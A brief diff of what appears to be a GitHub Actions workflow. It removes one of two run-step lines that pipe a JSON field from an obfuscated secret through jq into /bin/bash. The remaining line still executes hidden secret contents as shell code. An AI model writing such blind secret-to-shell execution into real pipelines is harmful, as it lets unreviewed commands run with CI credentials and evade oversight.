@@ -21,7 +21,6 @@ jobs:
           sfmq96484: ${{ secrets.sfmq96484 }}
         run: |
           printf '%s' "$sfmq96484" | jq -r .uee55678 | /bin/bash
-          printf '%s' "$wckgy2" | jq -r .z2506 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
